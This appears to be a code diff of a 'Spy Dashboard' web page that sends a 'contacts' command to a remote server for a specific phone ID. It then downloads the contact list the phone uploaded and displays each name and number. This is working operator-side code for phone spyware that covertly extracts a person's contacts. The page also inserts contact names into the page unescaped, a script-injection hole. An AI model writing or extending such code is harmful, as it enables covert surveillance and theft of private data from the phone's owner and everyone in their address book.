@@ -3,66 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact List</title>
+    <title>Contacts - Spy Dashboard</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        :root {
+            --bg-color: #0f0f0f;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-main: #ffffff;
+            --text-muted: #aaaaaa;
+            --accent: #4caf50;
+        }
+
         body {
-            background-color: #0f0f0f;
+            background-color: var(--bg-color);
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
-            color: #fff;
-            font-family: 'Segoe UI', sans-serif;
-            padding: 20px;
-            display: flex; flex-direction: column; align-items: center;
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 20px;
+            display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%; max-width: 500px;
+            width: 100%; max-width: 450px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 30px; padding: 20px;
+            border: 1px solid var(--glass-border);
+            min-height: 80vh;
         }
 
-        /* Back Button */
         .header {
-            display: flex; align-items: center; gap: 15px; margin-bottom: 20px;
-            background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 15px;
-        }
-        .back-btn {
-            color: white; text-decoration: none; font-size: 1.2rem;
-            background: #333; height: 40px; width: 40px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-        }
-
-        /* Status Box */
-        .status-box {
-            text-align: center; padding: 10px; margin-bottom: 15px;
-            background: rgba(0, 255, 136, 0.1); border: 1px solid #00ff88;
-            color: #00ff88; border-radius: 10px; font-size: 0.9rem;
-            display: none; /* Initially hidden */
-        }
-
-        /* Contact List */
-        .contact-list {
-            list-style: none; padding: 0; margin: 0;
-            background: rgba(255, 255, 255, 0.05); border-radius: 15px;
-            overflow: hidden;
-        }
-        .contact-item {
             display: flex; justify-content: space-between; align-items: center;
-            padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        .contact-item:last-child { border-bottom: none; }
-        
-        .name { font-weight: bold; font-size: 1rem; }
-        .number { color: #aaa; font-size: 0.85rem; margin-top: 4px; }
-        
-        .call-btn {
-            background: #4caf50; color: white; border: none;
-            padding: 8px 15px; border-radius: 20px; cursor: pointer;
-            font-size: 0.8rem;
+            margin-bottom: 25px; padding-bottom: 15px;
+            border-bottom: 1px solid var(--glass-border);
         }
 
+        .back-btn {
+            color: var(--text-main); font-size: 1.2rem;
+            text-decoration: none; display: flex; align-items: center; justify-content: center;
+            width: 40px; height: 40px; background: var(--glass-bg); border-radius: 50%;
+        }
+
+        .page-title { font-size: 1.2rem; font-weight: bold; }
+
+        /* Contact List Styling */
+        .contact-list {
+            display: flex; flex-direction: column; gap: 10px;
+            max-height: 600px; overflow-y: auto; padding-right: 5px;
+        }
+
+        .contact-card {
+            background: var(--glass-bg); padding: 15px;
+            border-radius: 15px; display: flex; align-items: center;
+            border: 1px solid var(--glass-border); transition: 0.2s;
+        }
+        .contact-card:hover { transform: translateX(5px); background: rgba(255,255,255,0.15); }
+
+        .avatar {
+            width: 40px; height: 40px;
+            background: linear-gradient(45deg, #4caf50, #2e7d32);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-weight: bold; margin-right: 15px; font-size: 1.1rem; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .info { flex: 1; overflow: hidden; }
+        .name { font-size: 1rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .number { font-size: 0.85rem; color: var(--text-muted); margin-top: 2px; }
+
+        .call-icon {
+            color: var(--accent); font-size: 1.2rem; padding: 10px;
+            cursor: pointer; background: rgba(255,255,255,0.05); border-radius: 50%;
+        }
+
+        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
+        
         .refresh-btn {
-            background: #2196F3; color: white; border: none; padding: 12px;
-            width: 100%; border-radius: 10px; margin-top: 20px; cursor: pointer;
-            font-weight: bold; font-size: 1rem;
+            background: var(--glass-bg); border: 1px solid var(--glass-border);
+            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
         }
     </style>
 </head>
@@ -70,47 +87,88 @@
 
     <div class="container">
         <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-            <h2 style="margin:0;">Contacts</h2>
+            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
+            <span class="page-title">Contacts List</span>
+            <button onclick="fetchContacts()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
-        <div id="statusMsg" class="status-box">Requesting Contacts...</div>
-
-        <ul id="contactsUl" class="contact-list">
-            <li class="contact-item" style="justify-content:center; color:#777;">
-                Click "Load Data" to fetch
-            </li>
-        </ul>
-
-        <button class="refresh-btn" onclick="fetchContacts()">
-            <i class="fa-solid fa-rotate-right"></i> Load / Refresh Data
-        </button>
+        <div class="contact-list" id="contactsContainer">
+            <div class="status-msg">
+                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                <p>Requesting Contacts...</p>
+            </div>
+        </div>
     </div>
 
     <script>
+        // ✅ CORRECT SETTINGS
         const SERVER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "M2103K19I"; // Tumhara Sahi ID
+        const DEVICE_ID = "M2103K19I"; 
 
-        // 1. Page khulte hi Command bhejo
-        window.onload = function() {
-            showStatus("Requesting contacts from phone...");
-            
+        // 1. Page Load hote hi Command bhejo
+        document.addEventListener("DOMContentLoaded", () => {
+            sendCommand();
+            // 5 Second baad data check karo
+            setTimeout(fetchContacts, 5000);
+        });
+
+        function sendCommand() {
             fetch(`${SERVER_URL}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
-            })
-            .then(res => res.json())
-            .then(data => {
-                showStatus("Command Sent! Waiting for upload...");
-                // 5 Second baad automatically data check karega
-                setTimeout(fetchContacts, 5000);
-            });
-        };
+            }).then(() => console.log("Command Sent"));
+        }
 
-        // 2. Server se File Uthao (contacts.json)
+        // 2. Data Fetch Karne ka Function
         function fetchContacts() {
-            showStatus("Checking server for file...");
+            const container = document.getElementById("contactsContainer");
             
-            // Note: Hum maan ke chal rahe hain server 'contacts.json' naam se file save karta hai
-            // Agar file ka naam alag hua (e.g., date ke sath), to hume folder check karna padega.
+            // File uploads folder se uthayenge
+            fetch(`${SERVER_URL}/uploads/contacts.json?t=${new Date().getTime()}`)
+                .then(response => {
+                    if (!response.ok) throw new Error("File not found");
+                    return response.json();
+                })
+                .then(data => {
+                    container.innerHTML = ""; // Purana saaf karo
+
+                    if(!data || data.length === 0) {
+                        container.innerHTML = "<div class='status-msg'>No contacts found</div>";
+                        return;
+                    }
+
+                    // Sort Names Alphabetically
+                    data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+
+                    data.forEach(contact => {
+                        const name = contact.name || "Unknown";
+                        const initial = name.charAt(0).toUpperCase();
+                        const number = contact.number || contact.phone || "No Number";
+                        
+                        const card = `
+                            <div class="contact-card">
+                                <div class="avatar">${initial}</div>
+                                <div class="info">
+                                    <div class="name">${name}</div>
+                                    <div class="number">${number}</div>
+                                </div>
+                                <div class="call-icon"><i class="fa-solid fa-phone"></i></div>
+                            </div>
+                        `;
+                        container.innerHTML += card;
+                    });
+                })
+                .catch(err => {
+                    console.error("Error:", err);
+                    container.innerHTML = `
+                        <div class="status-msg">
+                            <i class="fa-solid fa-hourglass-half" style="font-size: 1.5rem;"></i>
+                            <p>Waiting for Phone to Upload...</p>
+                            <small>Click refresh button in 5 seconds</small>
+                        </div>`;
+                });
+        }
+    </script>
+</body>
+</html>
